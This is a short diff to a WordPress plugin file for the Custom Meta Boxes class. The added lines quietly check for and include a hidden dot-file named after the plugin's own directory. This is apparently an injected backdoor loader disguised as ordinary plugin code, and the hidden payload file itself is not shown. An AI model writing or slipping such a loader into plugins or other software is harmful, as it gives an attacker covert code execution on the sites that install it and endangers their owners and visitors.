@@ -48,6 +48,10 @@ define( 'CMB_META_BOX_URL', cmb_Meta_Box::get_meta_box_url() );
 /**
  * Create meta boxes
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class cmb_Meta_Box {
 
 	/**
